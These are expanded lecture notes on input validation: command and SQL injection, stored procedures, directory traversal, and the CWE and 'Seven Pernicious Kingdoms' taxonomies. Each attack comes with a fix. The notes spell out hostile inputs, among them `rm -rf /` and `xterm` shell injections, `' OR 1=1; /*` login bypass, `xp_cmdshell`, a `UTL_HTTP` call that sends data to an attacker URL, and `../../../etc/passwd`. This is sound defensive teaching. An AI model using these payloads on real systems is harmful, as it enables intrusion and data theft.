Lecture 5 treats input validation as the unifying theme behind nearly every attack in the course: buffer overflows, command injection, SQL injection, file-name (directory-traversal) injection and XSS are all failures to validate untrusted input. It walks through command and SQL injection in detail (with the prepared-statement fix), directory traversal, and the general principles of validation (never trust input, white-list, least privilege). The slide deck has 31 pages. Slides 3, 7, 22 and 25 are the same agenda slide with the current topic highlighted; they are summarised once here.

## Input validation as the master vulnerability (pages 2-3)

### Slide 2 · Input Validation

> - Lack of input validation is the most commonly exploited vulnerability
> - Many variants of attacks that exploit this
>   - buffer overflows - "C(++) injection" - possibly via format string attacks and integer overflow attacks
>   - Command injection
>   - SQL injection
>   - XSS (Cross site scripting) - "script injection"
>   - ...

**Expansion.** This is the central claim of the whole course: **most exploited vulnerabilities are, at bottom, input-validation failures**. The program trusts data it should not, and that data is crafted by an attacker to do something unintended. Seen this way, the earlier lectures are special cases:

- A **buffer overflow** is "C(++) injection": unvalidated (over-long) input injected into memory, corrupting the stack or heap (Lecture 3). Its enablers, **format string attacks** (Lecture 4) and **integer overflows**, are themselves input problems.
- **Command injection** injects shell metacharacters so data becomes OS commands.
- **SQL injection** injects SQL metacharacters so data becomes database commands.
- **XSS** ("script injection") injects HTML/JavaScript so data becomes code in a victim's browser.

All share one mechanism (Lecture 4, Slide 23): untrusted data crosses into an interpreter and is read as code. The one discipline that defends against all of them is validating/sanitizing input before it reaches any interpreter. The agenda slides (3, 7, 22, 25) list the lecture's path: **buffer overflows (with format strings and integer overflow) → command injection → SQL injection → file name injection → general remarks**.

## Command injection (pages 4-6)

### Slide 4 · Command Injection (CGI script)

> - A CGI script might contain `cat thefile | mail clientaddress`
> - An attack might enter email address `pippo@di.uniroma1.it | rm -rf`
> - What happens then? `cat thefile | mail pippo@di.uniroma1.it | rm -rf/`
> - Can you think of countermeasures?
>   - validate input
>   - reduce access rights of CGI script (defense in depth)
>   - maybe we shouldn't use such a scripting languages for this?

**Code analysis.** A CGI script mails the contents of a file to a client-supplied address by building the pipeline `cat thefile | mail <clientaddress>` and running it through a shell.

- *Vulnerability: command injection via the pipe `|`.* The client's "email address" is inserted unvalidated into a shell command. Entering `pippo@di.uniroma1.it | rm -rf` makes the shell run `cat thefile | mail pippo@di.uniroma1.it | rm -rf/`, so after mailing the file the shell *also* executes `rm -rf /`, attempting to delete the entire filesystem. The pipe `|` (and `;`, `` ` ``, `&`) turn the data into extra commands (the same mechanism as Lecture 4).
- *Countermeasures (from the slide).*
  1. **Validate input** (primary): the email address must match a strict pattern (white-list of allowed address characters), rejecting any shell metacharacter.
  2. **Reduce the script's access rights** (defense in depth): if the CGI runs as an unprivileged, sandboxed user, even a successful injection cannot delete system files. This *mitigates* but does not *prevent*.
  3. **Reconsider the technology**: building shell pipelines from user input is inherently risky; a library that sends mail directly (e.g., an SMTP API) with no shell involved removes the attack surface entirely.

### Slide 5 · Command Injection (C program)

```c
char buf[1024];
snprintf(buf, "system lpr -P %s", printer_name, sizeof(buf)-1);
system(buf);
```

> This can be attacked in the same way; entering `miro;xterm&` is less destructive and more interesting than `...;rm -fr /`

**Code analysis.** This C code prints to a user-chosen printer by building `lpr -P <printer_name>` and passing it to `system`.

- *Vulnerability.* Same as the CGI case: `printer_name` is inserted into a shell command run by `system`, so shell metacharacters inject commands. `miro;xterm&` runs `lpr -P miro`, then (`;` separator) launches an `xterm` in the background (`&`). The slide notes that an interactive `xterm` is "more interesting" to an attacker than merely destroying files, because it gives a live shell. If the program is setuid root, that shell is a root shell.
- *Bug in the snippet.* The `snprintf` call is also written **wrongly**: the correct prototype is `snprintf(buf, size, format, args...)`, so the size must be the *second* argument. As written (`snprintf(buf, "system lpr -P %s", printer_name, sizeof(buf)-1)`) the format string is passed as the size and the size as an argument, which is broken. Also `"system "` should not be part of the `lpr` command text. The intended line is `snprintf(buf, sizeof(buf), "lpr -P %s", printer_name);`. This is incidental; the security bug is the `system` call on unvalidated input.
- *Fix.* Do not use `system`; use the `exec` family with an argument vector so no shell parses `printer_name` (Lecture 4, Slide 31): `execlp("lpr", "lpr", "-P", printer_name, (char*)NULL)`. Validate `printer_name` against the list of real printers (a white-list), and run with least privilege.

### Slide 6 · Command Injection (affected APIs)

> - Vulnerability: many API calls and language constructs in many languages are affected, eg
>   - C/C++ `system()`, `execvp()`, `ShellExecute()`, ..
>   - Java `Runtime.exec()`, ...
>   - Perl `system`, `exec`, `open`, `` ` ``, `/e`, ...
>   - Python `exec`, `eval`, `input`, `execfile`, ...
> - Countermeasures
>   - validate all user input - whitelist, not blacklist
>   - run with minimal privileges - doesn't prevent, but mitigates effects

**Expansion.** Command injection is not a C problem; every language has constructs that run external commands or evaluate code, and all are dangerous with untrusted input:

- **C/C++**: `system` (runs a shell), `popen`, `execlp`/`execvp` (safe *only* if the argument vector is not built from a shell string), `ShellExecute` (Windows). Note `execvp` is safer than `system` because it does not invoke a shell, provided you pass separate arguments.
- **Java**: `Runtime.exec()` / `ProcessBuilder` (use the array form, never the single-string form, which is re-split).
- **Perl**: `system`, `exec`, the two-argument vs list forms of `open` (a filename like `"rm -rf / |"` opened for piped I/O runs a command), backticks, and the `/e` regex modifier (which *evaluates* the replacement as code).
- **Python**: `exec`, `eval`, `os.system`, `subprocess` with `shell=True`, `input` (in Python 2, `input()` evaluated its argument), `execfile`.
- **Countermeasures (the course mantra):** *validate all user input with a white-list, not a black-list* (Lecture 4, Slides 36-38), and *run with minimal privileges* (least privilege, Lecture 10), which mitigates the impact of any injection that slips through. The strongest fix remains separating code from data (argument vectors, no shell).

## SQL injection (pages 8-21)

### Slide 8 · SQL injection (the login form)

![Lecture 5, page 8](L05_p08.webp "50% 1132x894")

**Figure.** A login dialog with two fields: **Username** = `pippo`, **Password** = `******`.

**Expansion.** The setup: a web login form takes a username and password and checks them against a database. The next slides show how the back-end builds a SQL query from these fields and how an attacker abuses it.

### Slides 9-10 · SQL injection (the vulnerable query)

```php
$result = mysql_query( "SELECT * FROM Accounts".
       "WHERE Username = '$username'". "AND Password = '$password';");
           if (mysql_num_rows($result)>0)
                  $login = true;
```

> Resulting SQL Query (for pippo / secret):
>
> `SELECT * FROM Accounts WHERE Username = 'pippo' AND Password = 'secret';`

**Code analysis.** The code builds a SQL query by **concatenating** the user-supplied `$username` and `$password` into the query string, then runs it; if any row matches, login succeeds.

- With honest input (`pippo` / `secret`) the query is the benign one shown: select the account whose username is `pippo` and password is `secret`. If it returns a row, the credentials were correct. So far so good, *for honest users*.
- The latent flaw: `$username` and `$password` are dropped into the query **inside single quotes**, with no escaping. The single quote `'` is SQL's string delimiter, a metacharacter. If the attacker's input contains a `'`, it closes the string early and the rest of the input is parsed as SQL *code*. (Minor note: the concatenation is missing spaces, so `Accounts`+`WHERE` would actually join to `AccountsWHERE`; treat it as illustrative.)

### Slides 11-13 · SQL injection (the attack)

![Lecture 5, page 11](L05_p11.webp "50% 1132x894")

**Figure (Slide 11).** The same login form, now with **Username** = `' OR 1=1; /*` and **Password** = `******`.

> Resulting SQL Query:
>
> `SELECT * FROM Accounts WHERE Username = '' OR 1=1;/*' AND Password = 'secret';`
>
> What does it mean? (Slide 13 shows how the DB reads it:)
>
> ```sql
> SELECT * FROM Accounts
> WHERE Username = '' OR 1=1;
> /*' AND Password = 'secret';
> ```

**Code analysis.** The attacker types `' OR 1=1; /*` as the username.

- *Closing the string.* The leading `'` closes the empty `Username = ''` string.
- *The always-true condition.* `OR 1=1` is appended to the `WHERE` clause. Since `1=1` is true for **every** row, the condition `Username = '' OR 1=1` is true for every row, so the query returns the *entire* `Accounts` table.
- *Discarding the password check.* `;` ends the statement, and `/*` begins a SQL **comment**, so everything after it, `' AND Password = 'secret';`, is **commented out** and ignored. The password is never checked.
- *Result.* `mysql_num_rows($result) > 0` is true (many rows returned), so `$login = true`: the attacker is logged in **without knowing any password**, typically as the first row, often the administrator. This is authentication bypass via SQL injection, one of the most damaging and common web vulnerabilities.
- Variants: ` ' OR '1'='1' --  ` (using `--` as the comment), or ` admin' --  ` to log in as a specific user. Beyond auth bypass, SQL injection can read any table (`UNION SELECT`), modify or delete data, and sometimes execute OS commands (Slide 19).

### Slide 14 · SQL Injection (the general lesson)

> - Vulnerability: any application in any programming language that connects to SQL database - if it uses dynamic SQL
> - Note the common theme to many injection attacks: concatenating strings, some of them user input, and then interpreting, rendering, or executing the result is a VERY BAD IDEA

**Expansion.** SQL injection is language-independent: it afflicts **any** application that builds SQL dynamically by string concatenation ("dynamic SQL"), in PHP, Java, Python, C#, anything. The slide states the deepest lesson of the course in one line: **building a string by concatenating code with user data and then interpreting/rendering/executing it is the root pattern of injection**, whether the interpreter is a shell, a SQL engine, a browser's HTML/JS parser, or `printf`. Remove the concatenation (separate code from data) and the vulnerability disappears, which is exactly what prepared statements do next.

### Slides 15, 17 · Avoiding SQL injection: Prepared Statement

> Vulnerable:
>
> ```java
> String updateString = "SELECT * FROM Account WHERE Username" + username + " AND Password = " + password;
> stmt.executeUpdate(updateString);
> ```
>
> Not Vulnerable:
>
> ```java
> PreparedStatement login =
> con.preparedStatement("SELECT * FROM Account WHERE Username = ? AND Password = ?" );
> login.setString(1, username);
> login.setString(2, password);
> login.executeUpdate();
> ```
>
> (Slide 17 labels the `?` placeholders "Variable Binding".)

**Code analysis.** The definitive fix for SQL injection: **prepared statements (parameterized queries) with bind variables**.

- *The vulnerable version* concatenates `username` and `password` into the query string, the bug of Slides 9-13.
- *The safe version* sends the query to the database with `?` **placeholders** instead of the values, and then binds the actual values separately with `setString(1, username)` and `setString(2, password)`. This is **variable binding**.
- *Why it is secure.* The database **parses and compiles the query template first**, with the `?` marking exactly where a *value* goes. The user-supplied strings are then sent as pure **data** that fills those slots; they are never parsed as SQL. So even if `username` is `' OR 1=1; /*`, the database treats that entire string as a literal username to look up, it looks for an account literally named `' OR 1=1; /*` (and finds none), rather than executing it as code. The code/data boundary is enforced by the database, not by fragile escaping.
- This is the concrete realisation of *"separate code from data"* (Lecture 4, Slide 33). Every modern database API provides it: JDBC `PreparedStatement` (Java), PDO prepared statements or mysqli with `bind_param` (PHP), parameterized queries in Python's DB-API (`cursor.execute(sql, params)`), `SqlCommand.Parameters` (.NET).
- **Important limit:** placeholders can only parameterize *values*, not table/column names or SQL keywords. If those must be dynamic, they must be validated against a strict white-list, never concatenated.

### Slide 16 · Similar: Stored Procedures

```sql
CREATE PROCEDURE login
         (name VARCHAR(100), pwd VARCHAR(100)) AS
DECLARE @sql nvarchar(4000)
SELECT @sql =' SELECT * FROM Account WHERE username=' + @name + 'AND password=' + @pwd
EXEC (@sql)
```

> Called from Java with:
>
> ```java
> CallableStatement proc =
> connection.prepareCall("{call login(?, ?)}");
> proc.setString(1, username);
> proc.setString(2, password);
> ```

**Code analysis.** A **stored procedure** is code stored and run inside the database; it is *often* suggested as an anti-injection measure, and the Java side (binding `?` parameters via `CallableStatement`) is indeed safe. **But the procedure body shown here is itself vulnerable!**

- *The flaw.* Inside the procedure, the parameters `@name` and `@pwd` are **concatenated into a dynamic SQL string** `@sql` and then run with `EXEC(@sql)`. So the injection just moves *inside* the stored procedure: passing `@name = ' OR 1=1; /*` reproduces exactly the auth-bypass of Slide 12, now executed by `EXEC`. The lesson: **a stored procedure is not automatically safe**; it is safe only if it *also* uses parameterization internally and avoids dynamic SQL (`EXEC`/`sp_executesql` on concatenated strings).
- *Fix.* Either write the procedure as a static parameterized query (`SELECT * FROM Account WHERE username = name AND password = pwd;`, no dynamic SQL), or, if dynamic SQL is truly needed, use `sp_executesql` with bound parameters. The call from the application should bind values (as shown) and the procedure body must do the same.
- *Side notes.* The example mixes Oracle PL/SQL syntax in the slide title with SQL-Server `@`-variable syntax in the body, and storing or comparing plaintext passwords is itself a serious flaw (passwords must be salted and slow-hashed, Lecture 1, Slide 14). These are incidental to the injection point.

### Slide 18 · Some Observations

> - Other issues - besides security - in discussions about prepared statements, stored procedures, bind variables, ...
>   - efficiency
>   - bandwidth between web-app and database
>   - stored procedures allow common fixed interface to several web-apps
> - Moral of the story: check the details for your configuration (language, database system) and your chosen solution!
> - Open question: Why is SQL injection still a problem??? - NB Top vulnerability in OWASP Top 10. Why doesn't everyone use parameterised queries???

**Expansion.** Prepared statements are not only safer, they often have **non-security advantages**: the database compiles and caches the query plan once and reuses it for every execution (efficiency), less SQL text travels over the network (bandwidth), and stored procedures give several applications one shared, fixed interface to the data. So the secure option is frequently also the better-engineered option.

The pointed question, *why is SQL injection still so common* despite a cheap, well-known, performance-positive fix, is left open deliberately. Realistic answers: legacy code written before the risk was understood; developers unaware or under time pressure; ORMs and query builders that still allow raw string queries as an escape hatch; dynamic parts (table names, `ORDER BY` columns) that cannot be parameterized and get concatenated; and copy-pasted insecure examples. The practical moral: know the exact behaviour of *your* language and database, and verify the chosen defence actually parameterizes.

### Slide 19 · Variation: Database Command Injection

> - injecting database command with `;`
> - not manipulating SQL query with `'`
> - highly dependent on infrastructure, e.g.
>   - each database has its own commands - E.g. Microsoft SQL Server has `exec master.dbo.xp_cmdshell`
>   - some configurations don't allow use of `;` - E.g. Oracle database accessed via Java or PL/SQL

![Lecture 5, page 19](L05_p19_1.webp "50% 1400x442")

**Expansion.** A distinct variant: instead of manipulating the *query logic* with the quote `'`, the attacker uses the statement separator `;` to **append an entirely new database command** ("stacked queries"). The possibilities depend heavily on the DBMS:

- **Microsoft SQL Server** historically exposes `xp_cmdshell`, an extended stored procedure that runs **operating-system commands** from inside the database. An injected `; exec master.dbo.xp_cmdshell 'net user ...'` turns SQL injection into OS command execution on the database server. (It is disabled by default in modern SQL Server for exactly this reason.)
- **Some configurations forbid stacked queries** (`;`): Oracle via JDBC/PL/SQL generally does not allow multiple statements in one call, which blocks this variant there, though other injection forms still apply.
- Takeaway: the *impact* of SQL injection is infrastructure-specific and can reach far beyond the database (full server compromise). Defences must be applied regardless, and the database should run with least privilege (no `xp_cmdshell`, a low-privilege DB account).

### Slide 20 · Variation: Function Call Injection

> - Oracle SQL has > 1000 built-in functions that can be used inside stored procedures, eg TRANSLATE: `TRANSLATE('acadaa', 'abcd', 'ABCD') = 'ACADAA'`
> - Arguments of such functions may be poisoned with other functions, e.g. `SELECT TRANSLATE('user input', 'abcd', 'ABCD') FROM ...` can become `SELECT TRANSLATE(''|| UTL_HTTP.REQUEST(http://.....) ||'', 'abcd', 'ABCD') FROM ...`
> - UTL\_HTTP does HTTP request directly from Oracle database, which is probably running behind the firewall...

**Code analysis.** A third variant: injecting a **function call** rather than a query clause.

- `TRANSLATE` is a harmless Oracle string function. But if user input flows into its argument, the attacker can inject a *different*, dangerous built-in function via string concatenation (`||` is Oracle's concatenation operator). Here the benign argument is replaced with `'' || UTL_HTTP.REQUEST('http://attacker...') || ''`.
- **`UTL_HTTP.REQUEST`** makes the Oracle database itself perform an outbound HTTP request. This is powerful for two reasons: it can **exfiltrate data** (append the stolen data to the attacker's URL) and it originates **from inside the network**, behind the firewall, so it can reach internal systems the attacker cannot reach directly (a server-side request forgery, SSRF, from the DB). Even in a configuration where `;` stacking is blocked (Slide 19), this works because it lives inside a single expression.
- *Fix.* Same as all SQL injection: never build SQL or its sub-expressions from unvalidated input; use bind variables so the input is a value, not part of an expression; restrict the database's network and package privileges (revoke `UTL_HTTP`).

### Slide 21 · Countermeasures to SQL injection

> - input validation
> - use prepared statements aka parameterised queries with bind variables - not string concatenation - or stored procedures, if these are safe
> - use language/system level countermeasures - eg magic quotes in PHP
> - apply principle of least privilege - ie. minimise rights of web application
> - know what you're doing: find out the threats & countermeasures for your specific configuration, programming language, database system…

**Expansion.** The layered defence, best first:

- **Prepared statements / parameterized queries with bind variables** are the primary, reliable fix (never string concatenation). Stored procedures help *only if* they are themselves parameterized (Slide 16).
- **Input validation** as defense in depth: even with parameterization, validate that inputs have the expected type, length and format (a username is alphanumeric, an age is an integer in range).
- **Language/system countermeasures** such as PHP's old `magic_quotes` auto-escaped quotes, but these are a *weak, deprecated* band-aid (removed in PHP 5.4): they can be bypassed (encodings, numeric contexts not wrapped in quotes) and give false confidence. The slide lists it as an example, not a recommendation.
- **Least privilege**: the web app's database account should have only the rights it needs (e.g., SELECT/INSERT on specific tables, no DROP, no `xp_cmdshell`, no file access), so a successful injection does limited damage.
- **Know your stack**: the exact threats and defences depend on the language and DBMS; verify them for your configuration.

## File name injection / directory traversal (pages 23-24)

### Slide 23 · File name injection

> - user-supplied file name may be
>   - existing file `../../../etc/passwd`
>   - not really a file `/var/spool/lpr`
>   - file the user can access in other ways `/mnt/usbkey`, `/tmp/file`
> - this may break
>   - Confidentiality (leaking information to the user)
>   - Integrity (eg. of file or system)
>   - Availability (eg. trying to open print device for reading)

**Expansion.** When a program opens a file whose name comes from the user, the attacker can supply a name that was never intended, attacking all three CIA goals:

- **An existing sensitive file**: `../../../etc/passwd` uses `..` to climb out of the intended directory and read a system file (the classic *path/directory traversal*), breaking **confidentiality**.
- **A "file" that is actually a device or special file**: `/var/spool/lpr`, `/dev/...`. Opening a device for the wrong operation can hang or disrupt it, breaking **availability** (the slide's "open print device for reading" example), or corrupt it, breaking **integrity**.
- **A file reachable by other means**: `/mnt/usbkey`, `/tmp/file`, letting the user read or influence data outside the intended scope.

### Slide 24 · File name injection (building names from input)

> - File names constructed from user input - eg by string concatenation - are suspect too
>   - Eg what is `"/usr/local/client-info/" ++ name`. What if name is `../../../etc/passwd`?
> - aka directory traversal attack
> - validating file names is difficult: reuse existing code and/or use chroot jail

**Code analysis.** Building a path by concatenating a fixed prefix with user input is the same string-concatenation anti-pattern as SQL injection.

- *Vulnerability.* `"/usr/local/client-info/" + name` looks confined to one directory, but if `name = "../../../etc/passwd"`, the `..` components walk up out of `client-info` and the resulting path is `/etc/passwd`. The prefix gives false confidence. This is **directory (path) traversal** (CWE-22).
- *Why validation is hard.* Filenames have many traps: `..` sequences, absolute paths, symbolic links (that point elsewhere), encodings (`..%2f`, `..%c0%af` as in the IIS Unicode worms), different path separators on Windows (`\`), trailing dots/spaces, NUL-byte truncation, and case-insensitive or Unicode-normalising filesystems. A naive "strip `..`" filter is easily bypassed (e.g., `....//` collapses to `../` after one pass, the multi-pass problem of Lecture 4, Slide 41).
- *Defences (from the slide, plus the standard ones).* **Reuse existing, vetted code** rather than writing your own filename sanitizer. **Use a chroot jail** (or a container) so the process cannot see files outside a confined subtree even if traversal succeeds. The robust programmatic approach: **canonicalize** the final path (`realpath`) and verify it still starts with the intended base directory *after* resolving `..` and symlinks; or better, do not accept filenames at all, use an opaque identifier (an index or key) that maps to a safe, server-chosen filename (white-listing). Apply least privilege so the process cannot read sensitive files anyway.

## General remarks on input validation (pages 26-32)

### Slide 26 · Input Validation in general

> - Input validation problems are the most common vulnerabilities
> - Never ever trust any user input
>   - Apart from generic risks discussed so far (command, SQL, XSS, filenames,...), there will be additional input risks specific to an application
> - Beware of implicit assumptions on user input
>   - eg, that usernames only contain alphanumeric characters
> - Think like an attacker!
>   - think how you might abuse a system with weird input

**Expansion.** The guiding principles:

- **Never trust any user input.** "User input" means *everything* from outside the trust boundary: form fields, URL parameters, cookies, HTTP headers, uploaded files, API payloads, data from other systems, even data from your own database if it originated from a user. Each application also has *domain-specific* input risks beyond the generic injection classes.
- **Beware implicit assumptions.** Code often silently assumes inputs are "reasonable" (a username is alphanumeric and short, a quantity is positive, a date is valid). Attackers deliberately violate these assumptions. Make every assumption explicit and enforce it.
- **Think like an attacker** (Lecture 1, Slide 32): for every input, ask "what is the weirdest, most hostile value someone could send, and what would it do?" This adversarial mindset is the heart of secure development.

### Slide 27 · Input Validation: prevention

> - Find out about potential vulnerabilities: use community resources to find out vulnerabilities of the system/language used
> - avoid use of unsafe constructs, if possible
> - make sure all input is validated at clear choke-points in code when doing input validation:
>   - use white-lists, not black-lists - unless you are 100% sure your black-list is complete
>   - reuse existing input validation code known to be correct

**Expansion.** How to *prevent* input-validation bugs:

- **Learn the known pitfalls** of your language and platform from community resources (OWASP, CWE, CERT, vendor advisories), since most vulnerabilities are variations of well-documented patterns.
- **Avoid unsafe constructs** (`system`, `eval`, dynamic SQL, `gets`) when a safe alternative exists.
- **Validate at clear choke-points.** Centralise validation so that all input passes through a small number of well-audited points (rather than ad-hoc checks scattered through the code, which are easy to miss). This makes it feasible to verify that *nothing* unvalidated reaches a sink.
- **White-list, not black-list** (Lecture 4, Slides 36-38): enumerate what is allowed, reject the rest, unless you can prove a black-list is complete (you almost never can, the phf newline).
- **Reuse vetted validation code** rather than reinventing it, since sanitizers are notoriously hard to get right.

### Slide 28 · Input Validation: detection

> - testing: test with inputs likely to cause problems
>   - for buffer overflow, long inputs (fuzzing)
>   - for SQL injection, inputs with fragments of SQL commands
>   - ...
>   - There are some tools that can help, eg webscarab for XSS. Note: web-application returning a page with SQL error message is a bad sign...
> - tainting
>   - effectively typing, with runtime checking or static analysis (more precisely, data flow analysis) - eg SA\_PRE(Tainted=SA\_True) in PREfast
> - code reviews, possibly using static analysis

**Expansion.** How to *detect* input-validation bugs that slipped through:

- **Targeted testing / fuzzing.** Test with the inputs that typically break things: very long strings (buffer overflow, Lecture 3), strings containing SQL fragments (`' OR 1=1`), shell metacharacters, HTML/script (XSS), path-traversal sequences. Tools such as *WebScarab* (an OWASP web proxy) help probe web apps. A telling symptom: if sending a `'` makes the app return a **database error message**, it is almost certainly SQL-injectable (and leaking internal detail, an information disclosure in itself).
- **Taint analysis (tainting).** Treat all external input as *tainted* and track its flow; flag any path where tainted data reaches a sensitive sink (a query, a command, a filesystem call) without being sanitized. It is "effectively a type system" (tainted vs untainted) enforced either at **run time** (Perl's taint mode, Lecture 4, Slide 33) or **statically** by data-flow analysis (Microsoft's PREfast annotations such as `SA_Pre(Tainted=SA_True)`; expanded in Lecture 7).
- **Code review and static analysis**: human review plus automated scanners to find missing validation (Lecture 3, Slide 50; Lecture 7).

### Slide 29 · 19 Deadly Sins of Software Security

![Lecture 5, page 29](L05_p29.webp "50% 1400x971")

**Figure.** A two-column list (Howard, LeBlanc, Viega, 2005); the items coloured blue are flagged "input problems":

| Deadly sin | Input problem? |
| --- | --- |
| Buffer overruns | yes |
| Format string problems | yes |
| Integer overflows | yes |
| SQL injection | yes |
| Command injection | yes |
| Failing to handle errors | no |
| XSS (cross-site scripting) | yes |
| Failing to protect network traffic | no |
| Use of magic URLs or hidden form fields | yes |
| Improper use of TLS, SSL | no |
| Weak passwords | no |
| Failing to store & protect data securely | no |
| Information leakage | yes |
| Improper file access | yes |
| Trusting network name resolution | yes |
| Race conditions | no |
| Unauthenticated key exchange | no |
| Weak random numbers | no |
| Poor usability | no |

**Expansion.** This classic list (*19 Deadly Sins of Software Security*) catalogs the most common security mistakes. The slide's point: a **large fraction of them (the blue ones) are input-validation problems** - buffer overruns, format strings, integer overflows, SQL/command injection, XSS, magic URLs/hidden fields (trusting client-side data), information leakage, improper file access, and trusting network name resolution (DNS) are all failures to properly validate or distrust external input. This empirically backs the lecture's thesis that input validation is *the* dominant vulnerability class. The non-input sins (crypto misuse, weak passwords, race conditions, etc.) are the subjects of other lectures.

### Slide 31 · Classification of Software Security Errors (Seven Pernicious Kingdoms)

> 1. Input Validation and Representation
> 2. API Abuse
> 3. Security Features
> 4. Time and State
> 5. Errors
> 6. Code Quality
> 7. Encapsulation \*. Environment
>
> \[Katrina Tsipenyuk, Brian Chess, Gary McGraw, Seven Pernicious Kingdoms: A Taxonomy of Software Security Errors\]

**Expansion.** The *Seven Pernicious Kingdoms* is an influential taxonomy that groups software security errors into categories ("kingdoms"), ordered by how often they cause problems. Tellingly, **"Input Validation and Representation" is kingdom number 1**, again putting input validation at the top. The others: *API Abuse* (calling an API in a way that violates its contract, e.g., ignoring return values), *Security Features* (misusing authentication, access control, crypto), *Time and State* (race conditions, Lecture 11), *Errors* (mishandling errors and exceptions), *Code Quality* (unpredictable behaviour from poor code, e.g., memory leaks, double frees), *Encapsulation* (failing to separate trusted from untrusted components), and the separate *Environment* kingdom (configuration and deployment issues outside the code). This taxonomy underlies static-analysis tools (Fortify) that categorise their findings.

### Slide 32 · One of the CVE Classifications

![Lecture 5, page 31](L05_p31.webp "50% 1400x1050")

**Figure.** A tree diagram ("Weaknesses Used by JVN iPedia") showing a hierarchy of CWE weakness categories, rooted at **CWE-1 Location**, branching into **CWE-16 Configuration**, **CWE-17 Code**, **CWE-2 Environment**. Under **Code → CWE-18 Source Code** the tree expands into the main weakness families:

- **CWE-19 Data Handling** → CWE-189 Numeric Errors, CWE-199 Information Management Errors, **CWE-20 Insufficient Input Validation** → CWE-21 Pathname Traversal and Equivalence Errors (→ CWE-22 Path Traversal, CWE-59 Link Following), **CWE-119 Buffer Errors**, **CWE-74 Injection** (→ CWE-134 Uncontrolled Format String, CWE-77 Command Injection → CWE-78 OS Command Injection, CWE-79 XSS, CWE-89 SQL Injection, CWE-94 Code Injection); CWE-200 Information Leak.
- **CWE-254 Security Features** → CWE-255 Credentials Management, CWE-284 Permissions/Privileges/Access Controls, CWE-310 Cryptographic Issues, CWE-287 Insufficient Authentication, CWE-345 Insufficient Verification of Data Authenticity (→ CWE-352 CSRF).
- **CWE-361 Time and State** → CWE-362 Race Condition; **CWE-398 Indicator of Poor Code Quality** → CWE-399 Resource Management Errors; **CWE-657 Violation of Secure Design Principles**; CWE-503 Byte/Object Code.

**Expansion.** This is MITRE's **CWE** (Common Weakness Enumeration) hierarchy as used by the Japanese JVN iPedia vulnerability database. It is a formal, tree-structured catalog of *weakness types* (as distinct from CVE, which names individual vulnerabilities; Lecture 1, Slide 37). The slide's point for this lecture: **CWE-20 "Insufficient Input Validation" and CWE-74 "Injection" are large, central nodes** whose descendants include almost every vulnerability studied so far, buffer errors (CWE-119), format strings (CWE-134), command injection (CWE-77/78), SQL injection (CWE-89), XSS (CWE-79), code injection (CWE-94), path traversal (CWE-22). The taxonomy makes visible that these are not unrelated bugs but siblings under one root cause: untrusted input that is not properly validated or separated from code. Knowing the CWE id of a bug lets you look up its standard description, examples and mitigations, and connects a found vulnerability to the general pattern it instantiates.
